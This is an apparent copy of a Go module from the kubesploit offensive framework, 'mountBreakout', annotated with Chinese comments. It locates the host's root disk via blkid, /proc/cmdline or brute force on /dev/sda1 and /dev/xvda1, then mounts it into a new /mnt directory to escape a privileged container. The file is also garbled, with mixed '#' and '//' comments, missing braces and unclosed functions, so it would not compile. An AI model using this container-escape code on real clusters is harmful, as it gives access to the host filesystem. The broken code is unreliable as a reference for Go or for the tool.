# `kubesploit\data\modules\sourcecode\go\mountBreakout\main.go`

```
package main

import (
	"fmt" // 导入 fmt 包，用于格式化输出
	"io/ioutil" // 导入 ioutil 包，用于读取文件内容
	"os" // 导入 os 包，用于操作系统功能
	"os/exec" // 导入 exec 包，用于执行外部命令
	"strconv" // 导入 strconv 包，用于字符串和基本数据类型之间的转换
	"strings" // 导入 strings 包，用于处理字符串
)

func extractDeviceType(deviceType string) (string,error) {
	var err error // 声明 err 变量，用于存储错误信息
	var device string // 声明 device 变量，用于存储设备类型

    if deviceType != "" { // 如果设备类型不为空
		cmd := exec.Command("blkid") // 创建一个执行外部命令的对象
		stdout, err := cmd.Output() // 执行命令并获取输出结果
		if err == nil { // 如果执行命令没有错误
			//fmt.Println(string(stdout)) // 打印命令输出结果
			// 将 stdout 转换为字符串并按行分割
			lines := strings.Split(string(stdout), "\n")
			// 遍历每一行
			for _, line := range lines {
				// 如果行包含 "ext4"
				if strings.Contains(line, "ext4") {
					// 以 ":" 分割行，并获取设备信息
					deviceSplitted := strings.Split(line, ":")
					device = deviceSplitted[0]
					// 结束循环
					break
				}
			}
		}

	} else {
		// 初始化 foundUUID 变量
		foundUUID := false
		// 读取 /proc/cmdline 文件内容
		dat, err := ioutil.ReadFile("/proc/cmdline")
		// 如果没有错误
		if err == nil {
			// 将文件内容转换为字符串
			cmdline := string(dat)
			// 以空格分割命令行参数
			splittedCmdLine := strings.Split(cmdline, " ")

			var uuid string

			// 提取设备的 UUID
# 遍历分割后的命令行参数列表
for _, splitLine := range splittedCmdLine {
    # 如果当前行以"root=UUID"开头
    if strings.HasPrefix(splitLine, "root=UUID") {
        # 获取UUID值并标记已找到UUID
        uuid = splitLine[10:]
        foundUUID = true
    }
}

# 如果找到了UUID
if foundUUID {
    # 执行命令"blkid"
    cmd := exec.Command("blkid")
    # 获取命令执行结果
    stdout, err := cmd.Output()

    # 如果没有错误
    if err == nil {
        # 将输出按行分割
        lines := strings.Split(string(stdout), "\n")
        # 遍历每一行
        for _, line := range lines {
            # 如果当前行包含UUID
            if strings.Contains(line, uuid) {
                # 根据":"分割当前行，获取设备信息
                deviceSplitted := strings.Split(line, ":")
                device = deviceSplitted[0]
            }
        }
    }
}
// 返回设备和错误信息
func mainfunc(device string, useBruteforce string, deviceType string){
    var err error
    var devices []string
    // TODO: 需要移除 'device == "none"` 并在 pkg/modules/modules.go 中的 Run 函数中修复它。
    // 出现这种情况是因为当没有值时，它使用 'append' 命令删除了数组。
    // "none" 目前只是一个临时解决方法
    if device == "" || device == "none" {
// 如果 useBruteforce 变量的值为 "true"，则执行以下操作
if useBruteforce == "true" {
    // 打印提示信息
    fmt.Println("[*] Using brute force on known devices [\"/dev/sda1\", \"/dev/xvda1\"]")
    // 将已知设备 "/dev/sda1" 和 "/dev/xvda1" 添加到 devices 切片中
    devices = append(devices, "/dev/sda1")
    devices = append(devices, "/dev/xvda1")
} else {
    // 否则，根据设备类型提取设备名称
    device, err = extractDeviceType(deviceType)
    // 如果设备名称为空或者提取出错，则执行以下操作
    if device == "" || err != nil {
        // 打印提示信息
        fmt.Println("[*] Didn't find device name, using brute force on known devices [\"/dev/sda1\", \"/dev/xvda1\"]")
        // 将已知设备 "/dev/sda1" 和 "/dev/xvda1" 添加到 devices 切片中
        devices = append(devices, "/dev/sda1")
        devices = append(devices, "/dev/xvda1")
    } else {
        // 否则，将提取到的设备名称添加到 devices 切片中
        devices = append(devices, device)
    }
}
// 如果条件不满足，将设备名称添加到 devices 切片中
} else {
    devices = append(devices, device)
}

// 创建文件夹
	// 初始化目录ID为0
	dirId := 0
	// 声明目录路径变量
	var dirPath string

	// 循环查找可写入的目录路径，如果没有权限在根目录下写入，则考虑写入到 /tmp 目录
	for {
		// 拼接目录路径
		dirPath = "/mnt" + strconv.Itoa(dirId)
		// 检查目录路径是否存在
		if _, err := os.Stat(dirPath); os.IsNotExist(err) {
			// 如果目录不存在，则创建目录
			os.Mkdir(dirPath, os.ModeDir)
			// 跳出循环
			break
		} else {
			// 如果目录已存在，则增加目录ID继续查找
			dirId += 1
		}
	}

	// 遍历设备列表
	for _, deviceName := range devices {
		// 打印尝试挂载设备到目录的信息
		fmt.Printf("[*] Trying to mount \"%s\" to \"%s\"\n", deviceName, dirPath)
		// 执行挂载命令
		cmd := exec.Command("mount", deviceName, dirPath)
		// 获取命令执行结果
		_, err = cmd.Output()
		// 如果有错误，则打印错误信息
		if err != nil {
			fmt.Println(err.Error())
// 如果条件不成立，打印挂载失败的信息
} else {
    fmt.Printf("[*] Mounted successfuly \"%s\" to \"%s\"\n", deviceName, dirPath)
    fmt.Printf("[*] Host folder is in: \"%s\"\n", dirPath)
}
// 结束 if-else 语句块
}
// 结束 mainfunc 函数

/*
func main(){
    mainfunc("", "false", "ext4")
   // mainfunc("/dev/sda1", "false")
   // mainfunc("", "true")
}*/
// 主函数，用于调用 mainfunc 函数
```